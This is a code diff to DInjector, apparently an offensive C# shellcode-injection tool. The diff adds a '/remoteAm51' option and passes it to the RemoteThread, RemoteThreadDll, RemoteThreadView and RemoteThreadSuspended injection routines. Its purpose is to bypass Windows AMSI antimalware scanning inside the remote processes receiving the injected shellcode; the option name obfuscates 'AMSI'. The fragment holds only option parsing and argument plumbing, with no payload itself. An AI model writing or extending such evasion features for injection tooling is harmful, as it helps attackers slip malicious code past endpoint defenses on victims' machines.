@@ -87,7 +87,7 @@ namespace DInjector
             catch (Exception)
             { }
 
-            // Bypass AMSI
+            // Bypass AMSI (current process)
             try
             {
                 if (bool.Parse(options["/am51"]))
@@ -136,6 +136,15 @@ namespace DInjector
             try
             {
                 flipSleep = int.Parse(options["/flipSleep"]);
+            }
+            catch (Exception)
+            { }
+
+            var remoteAm51 = false;
+            try
+            {
+                if (bool.Parse(options["/remoteAm51"]))
+                    remoteAm51 = true;
             }
             catch (Exception)
             { }
@@ -211,20 +220,23 @@ namespace DInjector
                     case "remotethread":
                         RemoteThread.Execute(
                             shellcodeBytes,
-                            int.Parse(options["/pid"]));
+                            int.Parse(options["/pid"]),
+                            remoteAm51);
                         break;
 
                     case "remotethreaddll":
                         RemoteThreadDll.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
-                            options["/dll"]);
+                            options["/dll"],
+                            remoteAm51);
                         break;
 
                     case "remotethreadview":
                         RemoteThreadView.Execute(
                             shellcodeBytes,
-                            int.Parse(options["/pid"]));
+                            int.Parse(options["/pid"]),
+                            remoteAm51);
                         break;
 
                     case "remotethreadsuspended":
@@ -237,7 +249,8 @@ namespace DInjector
                         RemoteThreadSuspended.Execute(
                             shellcodeBytes,
                             int.Parse(options["/pid"]),
-                            flipSleep);
+                            flipSleep,
+                            remoteAm51);
                         break;
 
                     case "remotethreadkernelcb":
